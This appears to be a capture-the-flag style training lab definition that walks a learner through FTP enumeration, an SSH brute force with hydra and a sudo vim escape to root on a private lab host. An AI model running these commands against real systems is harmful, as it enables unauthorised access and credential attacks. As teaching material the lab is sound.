# Lab 05 — FTP Enumeration & Privilege Escalation
**File:** `src/laboratorios/laboratorio05.ts`
**Date:** 2026-04-02
**Difficulty:** Medium
**Category:** Network
**Network Range:** 10.10.20.0/24
**Target:** 10.10.20.11

---

## Steps

### 01 — Host Discovery
**Text:** Discover the active host on the network
**Hint 1 (tool):** Use arp-scan to discover hosts
**Hint 2 (command):** `arp-scan 10.10.20.0/24`

### 02 — Port Scanning
**Text:** Identify the services running on the target
**Hint 1 (tool):** Use nmap for port scanning
**Hint 2 (command):** `nmap -sV <target-ip>`

### 03 — Anonymous FTP Access
**Text:** Connect to the FTP server with anonymous access
**Hint 1 (tool):** Connect using FTP client
**Hint 2 (command):** `ftp <ip>` then login as: anonymous

### 04 — Download Note
**Text:** List and download the note file from FTP
**Hint 1 (tool):** Use FTP commands to navigate
**Hint 2 (command):** `ls` to list, `get nota.txt` to download

### 05 — Read Note
**Text:** Exit FTP and read the downloaded note
**Hint 1 (tool):** Type exit to leave FTP session
**Hint 2 (command):** `cat nota.txt`

### 06 — SSH Brute Force
**Text:** Perform a brute force attack to get john's SSH credentials
**Hint 1 (tool):** Use hydra for brute force attack
**Hint 2 (command):** `hydra -l john -P rockyou.txt <ip> ssh`

### 07 — SSH Access
**Text:** Connect via SSH using the found credentials
**Hint 1 (tool):** Connect via SSH with credentials
**Hint 2 (command):** `ssh john@<ip>`

### 08 — Sudo Enumeration
**Text:** Check your sudo permissions on the system
**Hint 1 (tool):** Check sudo permissions
**Hint 2 (command):** `sudo -l`

### 09 — Privilege Escalation
**Text:** Exploit sudo permissions to escalate to root
**Hint 1 (tool):** Exploit sudo permissions on vim
**Hint 2 (command):** `sudo vim -c '!bash'`

### 10 — Capture Root Flag
**Text:** Read the root flag to complete the lab
**Hint 1 (tool):** You're root! Read the flag file
**Hint 2 (command):** `cat /root/flag2.txt`
